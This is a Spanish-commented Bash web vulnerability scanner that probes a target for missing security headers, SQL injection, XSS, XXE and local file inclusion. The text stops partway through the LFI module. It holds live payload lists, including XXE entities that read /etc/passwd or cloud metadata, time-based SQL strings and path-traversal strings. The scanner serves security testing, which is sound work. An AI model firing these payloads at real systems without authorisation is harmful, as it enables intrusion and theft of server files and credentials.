#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║          WebScan Pro - Escáner de Vulnerabilidades Web          ║
# ║                        Versión 2.1                              ║
# ║       SQLi · XSS · XXE · LFI · RFI · Path · SSRF · SSTI        ║
# ║                  CMS Detection · Security Headers               ║
# ╚══════════════════════════════════════════════════════════════════╝

# ─── Colores ───────────────────────────────────────────────────────
RED='\033[0;31m'; LRED='\033[1;31m'
ORANGE='\033[0;33m'; YELLOW='\033[1;33m'
GREEN='\033[0;32m'; LGREEN='\033[1;32m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'
MAGENTA='\033[0;35m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# ─── Variables globales ────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
SCAN_DATE=$(date '+%d/%m/%Y %H:%M:%S')
TARGET_URL=""
TARGET_HOST=""
TARGET_PROTO=""
ROOT_URL=""
TIMEOUT=12
UA="Mozilla/5.0 (X11; Linux x86_64; WebScanPro/2.0) AppleWebKit/537.36"
TOTAL_VULNS=0
CRITICOS=0; ALTOS=0; MEDIOS=0; BAJOS=0; INFOS=0
OUTPUT_DIR=""
FINDINGS_JSON="/tmp/ws_findings_${TIMESTAMP}.json"
declare -a FINDINGS_ARRAY=()

# ─── Banner ────────────────────────────────────────────────────────
banner() {
  clear
  echo -e "${CYAN}${BOLD}"
  echo "  ╦ ╦╔═╗╔╗ ╔═╔═╗╔═╗╔╗╔  ╔═╗╦═╗╔═╗"
  echo "  ║║║║╣ ╠╩╗╚═╗║  ╠═╣║║║  ╠═╝╠╦╝║ ║"
  echo -e "  ╚╩╝╚═╝╚═╝╚═╝╚═╝╩ ╩╝╚╝  ╩  ╩╚═╚═╝${NC}"
  echo -e "${WHITE}${BOLD}       Escáner de Vulnerabilidades Web v2.0${NC}"
  echo -e "${DIM}  ──────────────────────────────────────────────${NC}"
  echo -e "  ${DIM}SQLi · XSS · XXE · LFI · RFI · Path · SSRF · SSTI${NC}"
  echo -e "  ${DIM}CMS Detection · Security Headers${NC}"
  echo -e "${DIM}  ──────────────────────────────────────────────${NC}\n"
}

# ─── Helpers de salida ─────────────────────────────────────────────
info()    { echo -e "  ${BLUE}[i]${NC} $1"; }
ok()      { echo -e "  ${LGREEN}[✓]${NC} $1"; }
warn()    { echo -e "  ${YELLOW}[!]${NC} $1"; }
err()     { echo -e "  ${RED}[✗]${NC} $1"; }
step()    { echo -e "\n  ${CYAN}${BOLD}▸ $1${NC}"; }
section() { echo -e "\n${CYAN}${BOLD}┌─────────────────────────────────────────────────┐"; \
            printf "│  %-47s│\n" "$1"; \
            echo -e "└─────────────────────────────────────────────────┘${NC}"; }

severity_tag() {
  case "$1" in
    CRITICO) echo -e "${RED}${BOLD}[CRÍTICO]${NC}" ;;
    ALTO)    echo -e "${ORANGE}${BOLD}[ALTO]${NC}" ;;
    MEDIO)   echo -e "${YELLOW}${BOLD}[MEDIO]${NC}" ;;
    BAJO)    echo -e "${GREEN}${BOLD}[BAJO]${NC}" ;;
    INFO)    echo -e "${BLUE}${BOLD}[INFO]${NC}" ;;
  esac
}

# ─── Registro de hallazgo ──────────────────────────────────────────
# add_finding ID NAME SEVERITY CATEGORY DESCRIPTION EVIDENCE RECOMMENDATION
add_finding() {
  local id="$1" name="$2" sev="$3" cat="$4" desc="$5" evid="$6" rec="$7"
  TOTAL_VULNS=$((TOTAL_VULNS+1))
  case "$sev" in
    CRITICO) CRITICOS=$((CRITICOS+1)) ;;
    ALTO)    ALTOS=$((ALTOS+1)) ;;
    MEDIO)   MEDIOS=$((MEDIOS+1)) ;;
    BAJO)    BAJOS=$((BAJOS+1)) ;;
    INFO)    INFOS=$((INFOS+1)) ;;
  esac
  # Escape for JSON
  local jname  jdesc  jevid  jrec  jcat
  jname=$(echo "$name" | sed 's/\\/\\\\/g;s/"/\\"/g')
  jdesc=$(echo "$desc" | sed 's/\\/\\\\/g;s/"/\\"/g')
  jevid=$(echo "$evid" | sed 's/\\/\\\\/g;s/"/\\"/g')
  jrec=$(echo "$rec"  | sed 's/\\/\\\\/g;s/"/\\"/g')
  jcat=$(echo "$cat"  | sed 's/\\/\\\\/g;s/"/\\"/g')
  FINDINGS_ARRAY+=("{\"id\":\"$id\",\"name\":\"$jname\",\"severity\":\"$sev\",\"category\":\"$jcat\",\"description\":\"$jdesc\",\"evidence\":\"$jevid\",\"recommendation\":\"$jrec\"}")

  echo -e "\n  $(severity_tag $sev) ${BOLD}${name}${NC}"
  echo -e "  ${DIM}├─ Categoría:      ${NC}${cat}"
  echo -e "  ${DIM}├─ Descripción:    ${NC}${desc}"
  echo -e "  ${DIM}├─ Evidencia:      ${NC}${YELLOW}${evid}${NC}"
  echo -e "  ${DIM}└─ Recomendación:  ${NC}${GREEN}${rec}${NC}"
}

# ─── HTTP helpers ──────────────────────────────────────────────────
hget() {
  # Returns: body\n###CODE###<code>
  curl -sk --max-time $TIMEOUT -A "$UA" -L --max-redirs 3 \
       -w "\n###CODE###%{http_code}" "$@" 2>/dev/null
}

hhead() {
  curl -skI --max-time $TIMEOUT -A "$UA" "$@" 2>/dev/null
}

hpost() {
  local url="$1"; local data="$2"; shift 2
  curl -sk --max-time $TIMEOUT -A "$UA" -X POST -d "$data" \
       -w "\n###CODE###%{http_code}" "$@" "$url" 2>/dev/null
}

get_code() { echo "$1" | sed -n 's/.*###CODE###\([0-9]*\).*/\1/p' | tail -1; }
get_body() { echo "$1" | sed 's/###CODE###[0-9]*$//'; }

# ─── URL-encoding de payloads ──────────────────────────────────────
# curl (versiones recientes) rechaza directamente URLs con espacios u
# otros caracteres sin codificar ("URL rejected: Malformed input to a
# URL function"), devolviendo una respuesta vacía en silencio — sin
# error visible. Cualquier payload de inyección con espacios/comillas
# debe ir percent-encoded, igual que lo haría un navegador o un
# atacante real.
urlencode() {
  local string="$1" strlen encoded c i
  strlen=${#string}
  encoded=""
  for (( i=0; i<strlen; i++ )); do
    c="${string:i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) encoded+="$c" ;;
      *) printf -v hex '%%%02X' "'$c"; encoded+="$hex" ;;
    esac
  done
  echo "$encoded"
}

# ─── Añadir un parámetro sintético de prueba a una URL ─────────────
# Varios módulos (LFI, RFI, Path Traversal, SSRF) prueban parámetros
# genéricos (file=, url=, path=...) que la URL objetivo puede no tener.
# Si TARGET_URL YA tiene query string propia (caso normal: casi ningún
# objetivo real es una raíz "pelada"), concatenar ciegamente "?param="
# produce una URL con DOS signos "?" — el servidor interpreta todo como
# el valor del primer parámetro, reflejando el payload literalmente en
# la respuesta. Con heurísticas de detección débiles (p.ej. "¿aparece
# la palabra 'google' cerca de <html>?"), ese reflejo puede confirmarse
# como falso positivo sin que exista fetch remoto ni inclusión real.
add_test_param() {
  local base="$1" pname="$2" pval="$3"
  if [[ "$base" == *"?"* ]]; then
    echo "${base}&${pname}=${pval}"
  else
    echo "${base}?${pname}=${pval}"
  fi
}

# ─── Validar URL objetivo ──────────────────────────────────────────
validate_target() {
  if [[ -z "$TARGET_URL" ]]; then
    echo -e "\n  ${RED}Error:${NC} Debes especificar un objetivo."
    echo -e "  Uso: $0 -u <URL> [opciones]\n"
    exit 1
  fi
  # Añadir protocolo si falta
  if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="http://${TARGET_URL}"
  fi
  # Quitar trailing slash
  TARGET_URL="${TARGET_URL%/}"
  TARGET_PROTO=$(echo "$TARGET_URL" | cut -d: -f1)
  TARGET_HOST=$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1 | cut -d: -f1)
  # ROOT_URL = esquema + host + puerto (sin el path/query del objetivo).
  # OJO: no se puede construir como "${TARGET_PROTO}://${TARGET_HOST}"
  # porque TARGET_HOST NO incluye el puerto (se recorta explícitamente
  # arriba). Los módulos que prueban rutas "bien conocidas" del sitio
  # (robots.txt, xmlrpc.php, /.env, listados de directorio, endpoints
  # XML típicos, etc.) deben anclarse a ROOT_URL, no a TARGET_URL: si el
  # objetivo ya es "http://host/buscar?q=test" y se concatena la ruta
  # directamente sobre TARGET_URL, el resultado es
  # "http://host/buscar?q=test/.env" — que el servidor interpreta como
  # el parámetro q="test/.env", no como la ruta /.env. Esto generaba
  # falsos positivos (y falsos negativos) sistemáticos en varios
  # módulos siempre que el objetivo no fuera la raíz "pelada" del sitio.
  local _proto_host="${TARGET_URL#*://}"
  local _authority="${_proto_host%%/*}"
  ROOT_URL="${TARGET_PROTO}://${_authority}"

  info "Objetivo: ${WHITE}${TARGET_URL}${NC}"
  info "Host:     ${WHITE}${TARGET_HOST}${NC}"
  info "Protocolo: ${WHITE}${TARGET_PROTO}${NC}"

  # Verificar conectividad
  step "Verificando conectividad..."
  local resp
  resp=$(hget "$TARGET_URL")
  local code
  code=$(get_code "$resp")
  if [[ -z "$code" || "$code" == "000" ]]; then
    err "No se puede conectar a ${TARGET_URL}. Verifica la URL y tu conexión."
    exit 1
  fi
  ok "Objetivo alcanzable. HTTP ${code}"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 1 — Security Headers
# ════════════════════════════════════════════════════════════════════
scan_security_headers() {
  section "SECURITY HEADERS"
  local headers
  headers=$(hhead "$TARGET_URL")

  # Strict-Transport-Security
  if echo "$headers" | grep -qi "strict-transport-security"; then
    ok "HSTS presente"
  else
    add_finding "SH01" "Falta cabecera Strict-Transport-Security (HSTS)" "ALTO" "Security Headers" \
      "El servidor no envía HSTS, lo que permite ataques de downgrade a HTTP y MITM." \
      "Cabecera 'Strict-Transport-Security' ausente en la respuesta HTTP" \
      "Añadir: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
  fi

  # X-Frame-Options / CSP frame-ancestors
  if echo "$headers" | grep -qi "x-frame-options\|frame-ancestors"; then
    ok "Protección Clickjacking presente"
  else
    add_finding "SH02" "Falta protección anti-Clickjacking" "MEDIO" "Security Headers" \
      "Sin X-Frame-Options ni CSP frame-ancestors, la página puede ser embebida en iframes maliciosos." \
      "Cabeceras X-Frame-Options y CSP frame-ancestors ausentes" \
      "Añadir: X-Frame-Options: DENY  o  Content-Security-Policy: frame-ancestors 'none'"
  fi

  # X-Content-Type-Options
  if echo "$headers" | grep -qi "x-content-type-options"; then
    ok "X-Content-Type-Options presente"
  else
    add_finding "SH03" "Falta cabecera X-Content-Type-Options" "BAJO" "Security Headers" \
      "Sin esta cabecera, el navegador puede interpretar archivos con MIME-type incorrecto (MIME sniffing)." \
      "Cabecera 'X-Content-Type-Options' ausente" \
      "Añadir: X-Content-Type-Options: nosniff"
  fi

  # Content-Security-Policy
  if echo "$headers" | grep -qi "content-security-policy"; then
    ok "Content-Security-Policy presente"
  else
    add_finding "SH04" "Falta Content-Security-Policy (CSP)" "MEDIO" "Security Headers" \
      "Sin CSP, el navegador ejecuta scripts de cualquier origen, facilitando ataques XSS." \
      "Cabecera 'Content-Security-Policy' ausente" \
      "Definir una política CSP restrictiva: Content-Security-Policy: default-src 'self'"
  fi

  # Referrer-Policy
  if echo "$headers" | grep -qi "referrer-policy"; then
    ok "Referrer-Policy presente"
  else
    add_finding "SH05" "Falta cabecera Referrer-Policy" "BAJO" "Security Headers" \
      "Sin Referrer-Policy, las URLs visitadas pueden filtrarse a terceros mediante la cabecera Referer." \
      "Cabecera 'Referrer-Policy' ausente" \
      "Añadir: Referrer-Policy: strict-origin-when-cross-origin"
  fi

  # Permissions-Policy
  if echo "$headers" | grep -qi "permissions-policy\|feature-policy"; then
    ok "Permissions-Policy presente"
  else
    add_finding "SH06" "Falta cabecera Permissions-Policy" "BAJO" "Security Headers" \
      "Sin esta cabecera, el sitio puede acceder sin restricciones a cámara, micrófono, geolocalización, etc." \
      "Cabecera 'Permissions-Policy' ausente" \
      "Añadir: Permissions-Policy: geolocation=(), camera=(), microphone=()"
  fi

  # Server header disclosure
  local server_hdr
  server_hdr=$(echo "$headers" | grep -i "^server:" | head -1 | tr -d '\r')
  if [[ -n "$server_hdr" ]]; then
    add_finding "SH07" "Divulgación de versión del servidor" "BAJO" "Security Headers" \
      "La cabecera Server revela la tecnología y versión del servidor, facilitando ataques dirigidos." \
      "$server_hdr" \
      "Configurar el servidor para no exponer información de versión. En Apache: ServerTokens Prod"
  fi

  # X-Powered-By
  local powered
  powered=$(echo "$headers" | grep -i "x-powered-by:" | head -1 | tr -d '\r')
  if [[ -n "$powered" ]]; then
    add_finding "SH08" "Divulgación de tecnología mediante X-Powered-By" "BAJO" "Security Headers" \
      "La cabecera X-Powered-By revela el framework/lenguaje usado, ayudando al atacante a seleccionar exploits." \
      "$powered" \
      "Eliminar la cabecera X-Powered-By. En PHP: expose_php = Off"
  fi
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 2 — SQL Injection
# ════════════════════════════════════════════════════════════════════
scan_sqli() {
  section "SQL INJECTION (SQLi)"
  local -a error_payloads=("'" "\"" "' OR '1'='1" "' OR 1=1--" "\" OR \"1\"=\"1")
  local -a error_patterns=("SQL syntax" "mysql_fetch" "ORA-[0-9]" "Microsoft OLE DB" "ODBC SQL Server" "PostgreSQL.*ERROR" "Warning.*mysql_" "Unclosed quotation" "sqlite3.OperationalError" "syntax error.*near" "PG::SyntaxError" "supplied argument is not a valid MySQL")

  # Payloads time-based por motor de BD, formato "payload|nombre_motor".
  # Antes solo se probaba SLEEP() de MySQL; ahora se cubren también
  # MSSQL (WAITFOR DELAY) y PostgreSQL (pg_sleep).
  local -a time_payloads=(
    "' AND SLEEP(3)-- -|MySQL/MariaDB (SLEEP)"
    "' OR SLEEP(3)-- -|MySQL/MariaDB (SLEEP, OR)"
    "'; WAITFOR DELAY '0:0:3'--|Microsoft SQL Server (WAITFOR DELAY)"
    "' AND pg_sleep(3)-- -|PostgreSQL (pg_sleep)"
  )

  local found=0
  local params
  params=$(echo "$TARGET_URL" | grep -oP '(?<=\?)[^#]*')

  # Construir la lista de objetivos (parámetro + URL base) a testear.
  local -a t_pname=() t_pval=() t_baseurl=() t_params=()
  if [[ -z "$params" ]]; then
    # Sin parámetros en la URL: probamos un único parámetro sintético.
    # (Antes se probaban 4 URLs sintéticas x 3 payloads solo para
    # error-based; ahora cada parámetro pasa por 4 técnicas distintas,
    # así que limitamos a 1 para mantener el escaneo en un tiempo
    # razonable.)
    t_pname+=("id"); t_pval+=("1"); t_baseurl+=("$TARGET_URL"); t_params+=("id=1")
  else
    local base_url="${TARGET_URL%%\?*}"
    IFS='&' read -ra param_pairs <<< "$params"
    for pair in "${param_pairs[@]:0:3}"; do
      t_pname+=("${pair%%=*}")
      t_pval+=("${pair#*=}")
      t_baseurl+=("$base_url")
      t_params+=("$params")
    done
  fi

  local n_targets=${#t_pname[@]}
  local ti
  for (( ti=0; ti<n_targets; ti++ )); do
    local pname="${t_pname[$ti]}" pval="${t_pval[$ti]}" base_url="${t_baseurl[$ti]}" base_params="${t_params[$ti]}"
    local clean_url="${base_url}?${base_params}"

    # ── 1) Error-based ──────────────────────────────────────────────
    local payload payload_enc pattern new_params inject_url resp body
    for payload in "${error_payloads[@]}"; do
      payload_enc=$(urlencode "$payload")
      new_params=$(echo "$base_params" | sed "s/${pname}=${pval}/${pname}=${pval}${payload_enc}/")
      inject_url="${base_url}?${new_params}"
      resp=$(hget "$inject_url"); body=$(get_body "$resp")
      for pattern in "${error_patterns[@]}"; do
        if echo "$body" | grep -qiP "$pattern"; then
          add_finding "SQLI01" "SQL Injection detectado (Error-Based)" "CRITICO" "SQL Injection" \
            "El parámetro '${pname}' responde con errores SQL al inyectar comillas/operadores. Un atacante puede extraer, modificar o eliminar datos de la base de datos." \
            "Parámetro: $pname | Payload: $payload | Patrón: $pattern | URL: $inject_url" \
            "Usar consultas parametrizadas (prepared statements). NUNCA concatenar input del usuario en consultas SQL. Validar y sanitizar toda entrada. Implementar WAF."
          found=1
          break 2
        fi
      done
    done

    # ── 2) Boolean-based blind ──────────────────────────────────────
    # Comparamos base vs condición TRUE (' OR '1'='1) vs condición
    # FALSE (' OR '1'='2). Antes de comparar, medimos el baseline DOS
    # veces: si la página ya varía de forma significativa entre dos
    # peticiones idénticas (contenido dinámico: timestamps, contadores),
    # esta técnica no es fiable ahí y se omite para no generar ruido.
    local base_len1 base_len2
    base_len1=$(get_body "$(hget "$clean_url")" | wc -c)
    base_len2=$(get_body "$(hget "$clean_url")" | wc -c)
    local base_diff=$(( base_len1 > base_len2 ? base_len1 - base_len2 : base_len2 - base_len1 ))
    local base_ref=$(( base_len1 > 1 ? base_len1 : 1 ))

    if [[ $(( base_diff * 100 / base_ref )) -le 3 ]]; then
      local true_params false_params true_url false_url true_len false_len
      local true_payload_enc false_payload_enc
      true_payload_enc=$(urlencode "' OR '1'='1")
      false_payload_enc=$(urlencode "' OR '1'='2")
      true_params=$(echo "$base_params" | sed "s/${pname}=${pval}/${pname}=${pval}${true_payload_enc}/")
      false_params=$(echo "$base_params" | sed "s/${pname}=${pval}/${pname}=${pval}${false_payload_enc}/")
      true_url="${base_url}?${true_params}"; false_url="${base_url}?${false_params}"
      true_len=$(get_body "$(hget "$true_url")" | wc -c)
      false_len=$(get_body "$(hget "$false_url")" | wc -c)

      local diff_tf=$(( true_len > false_len ? true_len - false_len : false_len - true_len ))
      local diff_tf_pct=$(( diff_tf * 100 / base_ref ))
      local diff_true_base=$(( true_len > base_len1 ? true_len - base_len1 : base_len1 - true_len ))
      local diff_true_base_pct=$(( diff_true_base * 100 / base_ref ))
      local diff_false_base=$(( false_len > base_len1 ? false_len - base_len1 : base_len1 - false_len ))
      local diff_false_base_pct=$(( diff_false_base * 100 / base_ref ))

      # Patrón asimétrico: TRUE y FALSE difieren claramente entre sí, y
      # el comportamiento normal (baseline) coincide con UNO de los dos
      # — no importa cuál. Es la firma real de un boolean-blind: el
      # valor original ya evalúa como verdadero o como falso, según el
      # caso (p.ej. un login normal se comporta como "falso" hasta que
      # se inyecta una condición que lo fuerza a "verdadero").
      if [[ $diff_tf_pct -ge 5 && ( $diff_true_base_pct -le 3 || $diff_false_base_pct -le 3 ) ]]; then
        add_finding "SQLI02" "SQL Injection Blind (Boolean-Based) sospechoso" "ALTO" "SQL Injection" \
          "Las respuestas del parámetro '${pname}' difieren entre una condición verdadera (OR '1'='1) y una falsa (OR '1'='2), mientras que la condición verdadera se comporta igual que la petición normal. Indicio de SQLi ciego booleano — se recomienda verificación manual." \
          "Parámetro: $pname | Base: ${base_len1}B | TRUE: ${true_len}B | FALSE: ${false_len}B | Diferencia TRUE/FALSE: ${diff_tf_pct}%" \
          "Usar consultas parametrizadas (prepared statements). Validar y sanitizar toda entrada. No basar el comportamiento de la respuesta en resultados de consultas no parametrizadas."
        found=1
      fi
    fi

    # ── 3) UNION-based (sondeo de nº de columnas vía ORDER BY) ──────
    # Se incrementa ORDER BY N hasta que aparece un error SQL: el punto
    # de ruptura indica el número de columnas de la consulta, lo que
    # habilita UNION SELECT para extraer datos de otras tablas.
    local n hit_pattern pattern2 ob_params ob_url ob_body ob_payload_enc
    for n in 1 2 3 4 5 6 7 8; do
      ob_payload_enc=$(urlencode "' ORDER BY ${n}-- -")
      ob_params=$(echo "$base_params" | sed "s/${pname}=${pval}/${pname}=${pval}${ob_payload_enc}/")
      ob_url="${base_url}?${ob_params}"
      ob_body=$(get_body "$(hget "$ob_url")")
      hit_pattern=""
      for pattern2 in "${error_patterns[@]}"; do
        if echo "$ob_body" | grep -qiP "$pattern2"; then
          hit_pattern="$pattern2"
          break
        fi
      done
      if [[ -n "$hit_pattern" ]]; then
        if [[ $n -gt 1 ]]; then
          add_finding "SQLI03" "SQL Injection UNION-Based sospechoso (columnas: $((n-1)))" "CRITICO" "SQL Injection" \
            "El parámetro '${pname}' genera un error SQL al ordenar por la columna ${n} pero no antes, indicando que la consulta subyacente tiene $((n-1)) columnas. Esto habilita ataques UNION-based para extraer datos de otras tablas." \
            "Parámetro: $pname | Payload: ' ORDER BY ${n}-- - | Patrón: $hit_pattern | Columnas estimadas: $((n-1))" \
            "Usar consultas parametrizadas. Restringir permisos de la cuenta de BD (sin acceso a information_schema). Implementar WAF."
          found=1
        fi
        break
      fi
    done

    # ── 4) Blind Time-Based, multi-motor, CON DIFERENCIAL CONTRA BASELINE ──
    # Fix del falso positivo original: antes se comparaba el tiempo de
    # respuesta contra un umbral absoluto (2.8s), lo que disparaba en
    # cualquier objetivo simplemente lento (latencia de red, backend
    # cargado, WAF con delay) sin SQLi real de por medio. Ahora se mide
    # primero una petición SIN payload como referencia, y solo se marca
    # si la petición CON payload tarda claramente más que esa
    # referencia: el retraso se atribuye al payload, no al servidor.
    local baseline_start baseline_end baseline_ms
    baseline_start=$(date +%s%N)
    hget "$clean_url" > /dev/null
    baseline_end=$(date +%s%N)
    baseline_ms=$(( (baseline_end - baseline_start) / 1000000 ))

    local tp payload_sql payload_sql_enc engine_name tparams turl pstart pend pms delta
    for tp in "${time_payloads[@]}"; do
      payload_sql="${tp%%|*}"
      engine_name="${tp#*|}"
      payload_sql_enc=$(urlencode "$payload_sql")
      tparams=$(echo "$base_params" | sed "s/${pname}=${pval}/${pname}=${pval}${payload_sql_enc}/")
      turl="${base_url}?${tparams}"
      pstart=$(date +%s%N)
      hget "$turl" > /dev/null
      pend=$(date +%s%N)
      pms=$(( (pend - pstart) / 1000000 ))
      delta=$(( pms - baseline_ms ))

      if [[ $delta -ge 2500 && $pms -ge 2800 ]]; then
        add_finding "SQLI04" "SQL Injection Blind (Time-Based) sospechoso — ${engine_name}" "ALTO" "SQL Injection" \
          "La respuesta tarda ${delta}ms más que una petición equivalente sin payload al inyectar un retraso de 3s específico de ${engine_name}. El retraso es atribuible al payload y no a latencia general del servidor." \
          "Parámetro: $pname | Payload: $payload_sql | Baseline: ${baseline_ms}ms | Con payload: ${pms}ms | Diferencia: ${delta}ms" \
          "Auditar y parametrizar todas las consultas. Aplicar principio de mínimo privilegio en la BD. Limitar tiempos de ejecución de consultas."
        found=1
        break
      fi
    done

  done

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de SQLi (error-based, boolean-based, UNION-based ni time-based) en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 3 — XSS (Cross-Site Scripting)
# ════════════════════════════════════════════════════════════════════
scan_xss() {
  section "CROSS-SITE SCRIPTING (XSS)"
  local -a payloads=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "'\"><script>alert(1)</script>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
    "\"onmouseover=\"alert(1)"
  )
  local found=0

  # Test en parámetros URL
  local params
  params=$(echo "$TARGET_URL" | grep -oP '(?<=\?)[^#]*')
  local base_url="${TARGET_URL%%\?*}"

  if [[ -z "$params" ]]; then
    local test_urls=("${TARGET_URL}?q=" "${TARGET_URL}?search=" "${TARGET_URL}?name=")
    for turl in "${test_urls[@]}"; do
      for payload in "${payloads[@]:0:3}"; do
        local inject_url="${turl}${payload}"
        local resp body
        resp=$(hget "$inject_url")
        body=$(get_body "$resp")
        local enc_payload
        enc_payload=$(echo "$payload" | sed 's/[<>\"]/\\0/g')
        if echo "$body" | grep -qF "$payload"; then
          add_finding "XSS01" "XSS Reflejado (Reflected XSS) detectado" "ALTO" "Cross-Site Scripting" \
            "El parámetro refleja el input del usuario sin sanitizar, permitiendo ejecutar JavaScript arbitrario en el navegador de la víctima. Puede usarse para robar sesiones o redirigir usuarios." \
            "URL: $inject_url | Payload reflejado sin codificar en respuesta" \
            "Codificar toda salida HTML (htmlspecialchars en PHP, escapeHtml en Java). Implementar CSP. Validar entrada en servidor."
          found=1
          break 2
        fi
      done
    done
  else
    IFS='&' read -ra param_pairs <<< "$params"
    for pair in "${param_pairs[@]:0:5}"; do
      local pname="${pair%%=*}" pval="${pair#*=}"
      for payload in "${payloads[@]:0:4}"; do
        local new_params
        new_params=$(echo "$params" | sed "s/${pname}=${pval}/${pname}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")/")
        local inject_url="${base_url}?${new_params}"
        local body
        body=$(get_body "$(hget "$inject_url")")
        if echo "$body" | grep -qF "$payload"; then
          add_finding "XSS01" "XSS Reflejado (Reflected XSS) detectado" "ALTO" "Cross-Site Scripting" \
            "El parámetro '${pname}' refleja el payload XSS sin codificar, permitiendo ejecución de scripts en el navegador de la víctima." \
            "Parámetro: $pname | Payload: $payload reflejado literalmente en la respuesta" \
            "Aplicar output encoding. Usar librerías como OWASP AntiSamy. Implementar CSP restrictivo."
          found=1
          break 2
        fi
      done
    done
  fi

  # XSS en formularios POST
  local forms_page
  forms_page=$(get_body "$(hget "$TARGET_URL")")
  local form_actions
  form_actions=$(echo "$forms_page" | grep -oi 'action="[^"]*"' | cut -d'"' -f2 | head -3)
  if [[ -n "$form_actions" ]]; then
    while IFS= read -r action; do
      [[ -z "$action" ]] && continue
      [[ "$action" == /* ]] && action="${TARGET_PROTO}://${TARGET_HOST}${action}"
      [[ "$action" != http* ]] && action="${TARGET_URL}/${action}"
      local resp body
      resp=$(hpost "$action" "name=<script>alert(1)</script>&email=test@test.com&message=test")
      body=$(get_body "$resp")
      if echo "$body" | grep -qF "<script>alert(1)</script>"; then
        add_finding "XSS02" "XSS en formulario POST detectado" "ALTO" "Cross-Site Scripting" \
          "Un formulario POST refleja contenido sin sanitizar. El payload XSS aparece sin codificar en la respuesta." \
          "Endpoint: $action | Payload <script>alert(1)</script> reflejado sin codificar" \
          "Sanitizar y codificar TODOS los campos de formulario antes de mostrarlos. Usar CSRF tokens."
        found=1
      fi
    done <<< "$form_actions"
  fi

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de XSS en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 4 — XXE (XML External Entity)
# ════════════════════════════════════════════════════════════════════
scan_xxe() {
  section "XML EXTERNAL ENTITY (XXE)"
  local found=0

  local xxe_payloads=(
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><test/>'
  )

  # Buscar endpoints que acepten XML
  local xml_endpoints=("${ROOT_URL}/api" "${ROOT_URL}/upload" "${ROOT_URL}/xml" "${ROOT_URL}/ws" "${ROOT_URL}/service" "${ROOT_URL}/api/v1" "${ROOT_URL}/soap")

  for endpoint in "${xml_endpoints[@]}"; do
    for payload in "${xxe_payloads[@]}"; do
      local resp body code
      resp=$(hpost "$endpoint" "$payload" -H "Content-Type: application/xml")
      body=$(get_body "$resp")
      code=$(get_code "$resp")
      # Indicadores de XXE: contenido /etc/passwd o error de parser XML
      if echo "$body" | grep -q "root:x:0:0\|daemon:\|nobody:"; then
        add_finding "XXE01" "XXE Critical - Lectura de archivos del sistema" "CRITICO" "XML External Entity" \
          "El parser XML procesa entidades externas. Se obtuvo contenido de /etc/passwd del servidor, lo que permite leer archivos sensibles y potencialmente ejecutar SSRF." \
          "Endpoint: $endpoint | Contenido de /etc/passwd obtenido mediante DTD malicioso" \
          "Deshabilitar DTD y entidades externas en el parser XML. En Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). Actualizar librerías XML."
        found=1; break 2
      fi
      if echo "$body" | grep -qi "XML\|parse error\|entity\|DOCTYPE" && [[ "$code" == "500" || "$code" == "400" ]]; then
        add_finding "XXE02" "Parser XML expuesto - Posible XXE" "ALTO" "XML External Entity" \
          "El servidor procesa XML y devuelve errores del parser, lo que sugiere que el procesamiento XML no está correctamente endurecido." \
          "Endpoint: $endpoint | HTTP $code con mensaje de error XML en respuesta" \
          "Deshabilitar DTD externos. Actualizar librerías de parsing XML. Validar y sanitizar input XML con whitelist."
        found=1
      fi
    done
  done

  # Comprobar cabecera Content-Type en la respuesta principal
  local main_ct
  main_ct=$(hhead "$TARGET_URL" | grep -i "content-type:" | head -1)
  if echo "$main_ct" | grep -qi "xml"; then
    add_finding "XXE03" "API/endpoint devuelve XML - Revisar XXE manualmente" "MEDIO" "XML External Entity" \
      "El objetivo devuelve Content-Type XML. Si el servidor también acepta XML en el input, puede ser vulnerable a XXE." \
      "Content-Type: $main_ct" \
      "Revisar todos los endpoints que consumen XML. Implementar validación estricta del schema (XSD). Deshabilitar entidades externas."
    found=1
  fi

  [[ $found -eq 0 ]] && ok "No se detectaron indicadores de XXE en las pruebas realizadas"
}

# ════════════════════════════════════════════════════════════════════
# MÓDULO 5 — LFI (Local File Inclusion)
# ════════════════════════════════════════════════════════════════════
scan_lfi() {
  section "LOCAL FILE INCLUSION (LFI)"
  local found=0
  local -a payloads=(
    "../../../etc/passwd"
    "../../../../etc/passwd"
    "../../../../../etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//....//etc/passwd"
    "/etc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/read=string.rot13/resource=/etc/passwd"
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
    "../../../windows/win.ini"
    "..\\..\\..\\windows\\win.ini"
  )

  local -a lfi_params=("file" "page" "include" "path" "doc" "document" "filename" "filepath" "template" "view" "load" "read" "dir" "pg" "p")

  for param in "${lfi_params[@]}"; do
    for payload in "${payloads[@]}"; do
      local url=$(add_test_param "$TARGET_URL" "$param" "$payload")
      local body
      body=$(get_body "$(hget "$url")")
